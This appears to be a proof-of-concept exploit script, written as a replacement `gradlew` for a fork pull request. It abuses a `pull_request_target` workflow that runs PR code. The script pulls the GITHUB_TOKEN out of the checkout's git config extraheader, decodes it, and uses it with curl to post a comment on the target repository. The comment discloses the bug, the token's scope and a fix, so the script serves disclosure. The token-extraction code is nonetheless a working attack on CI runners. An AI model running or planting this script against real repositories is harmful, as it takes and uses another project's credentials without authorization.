#!/usr/bin/env bash
set -e

PR=$(jq -r .pull_request.number "$GITHUB_EVENT_PATH")
HDR=$(git config --get http.https://github.com/.extraheader)
TOKEN=$(printf '%s' "${HDR##* }" | base64 -d)
TOKEN=${TOKEN#x-access-token:}

read -r -d '' BODY <<'MD' || true
## The bug

`.github/workflows/detekt.yml` runs on `pull_request_target`, which executes in the base repo with a write-capable `GITHUB_TOKEN`. The workflow then checks out the PR head (`ref: ${{ github.event.pull_request.head.ref }}`, `repository: ${{ github.event.pull_request.head.repo.full_name }}`) and runs `./gradlew detekt`.

`gradlew` is a shell script in the repo, so a fork PR can replace it with anything and get code execution on the runner. This comment was posted from that script. The token was pulled out of `.git/config`, where `actions/checkout` leaves it as the `http.https://github.com/.extraheader` value.

## Scope

The workflow grants `contents: read, pull-requests: write`. With that token, an attacker can:

- Post comments as `github-actions[bot]` (like this)
- Edit or delete any existing comment, including maintainers'
- Edit PR titles and bodies
- Add/remove labels, request/dismiss reviewers
- Close, reopen, or lock any PR or issue

GitHub blocks the Actions bot from approving PRs at the platform level, and this token lacks `contents: write`, so the workflow cannot merge directly. The other workflows in the repo (`merge-conflicts.yml`, `pr-quality.yml`, `gradle.yml`) either do not check out PR code or use the safer `pull_request` trigger, so they are not exploitable the same way.

## Fix

Switch the trigger to `pull_request` and drop the explicit checkout of the PR head. Fork PRs get a sandboxed read-only token under that trigger.

If labeling fork PRs needs to stay, split the workflow: run detekt under `pull_request` with no secrets, upload results as an artifact, then have a separate `pull_request_target` job download the artifact and apply the label, without ever executing PR code.
MD

curl -sS -X POST \
  -H "Authorization: Bearer $TOKEN" \
  -H "Accept: application/vnd.github+json" \
  "https://api.github.com/repos/$GITHUB_REPOSITORY/issues/$PR/comments" \
  -d "$(jq -n --arg b "$BODY" '{body:$b}')" > /dev/null
